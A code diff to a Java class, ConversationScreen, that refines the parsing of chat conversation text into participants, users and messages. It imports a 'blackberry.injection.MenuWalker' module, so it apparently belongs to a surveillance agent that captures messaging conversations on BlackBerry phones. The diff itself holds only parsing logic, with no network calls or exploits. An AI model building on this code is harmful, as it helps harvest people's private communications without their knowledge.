@@ -11,6 +11,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
 import blackberry.utils.Check;
+import blackberry.utils.Utils;
 
 public class ConversationScreen {
     private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
@@ -115,12 +116,21 @@ public class ConversationScreen {
             int pos = conversation.indexOf("-------------");
             String partecipants;
             //String partecipant1, partecipant2;
-            int posStart = conversation.indexOf("\n", pos) + 1;
-            int posSep = conversation.indexOf(", ", posStart);
-            int posEnd = conversation.indexOf("\n", posSep);
+            int partStart = conversation.indexOf("\n", pos) + 1;
+            int partSep = conversation.indexOf(", ", partStart);
+            int partEnd = conversation.indexOf("\n", partSep);
 
-            partecipants = conversation.substring(posStart, posEnd);
+            partecipants = conversation.substring(partStart, partEnd);
 
+            Vector users = Utils.Tokenize(partecipants, ", ");
+            if(users.size()<2){
+                //#ifdef DEBUG
+                debug.error("parseConversation: error partecipants");
+                //#endif
+                
+                return null;
+            }
+            
             Vector result = new Vector();
 
             //partecipant1 = conversation.substring(posStart, posSep);
@@ -133,6 +143,7 @@ public class ConversationScreen {
 
             Vector lines = new Vector();
 
+            String lastLine = "";
             while (true) {
                 String currentLine = getNextLine(conversation, posMessages);
                 if (currentLine == null) {
@@ -140,10 +151,28 @@ public class ConversationScreen {
                 }
                 posMessages += currentLine.length() + 1;
 
-                posSep = currentLine.indexOf(":");
-                String user = currentLine.substring(0, posSep);
-                String message = currentLine.substring(posSep + 2);
+                partSep = currentLine.indexOf(":");
+                if (partSep == -1) {
+                    lastLine = currentLine;
+                    continue;
+                } else {
+                    currentLine = lastLine +" "+ currentLine;
+                    partSep += lastLine.length()+1;
+                    lastLine = "";
+                }
+                String userFull = currentLine.substring(0, partSep).trim();
+                
+                String message = currentLine.substring(partSep + 2).trim();
 
+                String user = Utils.firstWord(userFull);
+                if(!users.contains(user)){
+                    user = userFull;
+                }else{
+                    //#ifdef DEBUG
+                    debug.trace("parseConversation, user found: "+user);
+                    //#endif
+                }
+                
                 if (numLine < 5) {
                     //#ifdef DEBUG
                     debug.trace("line " + numLine + " user: " + user
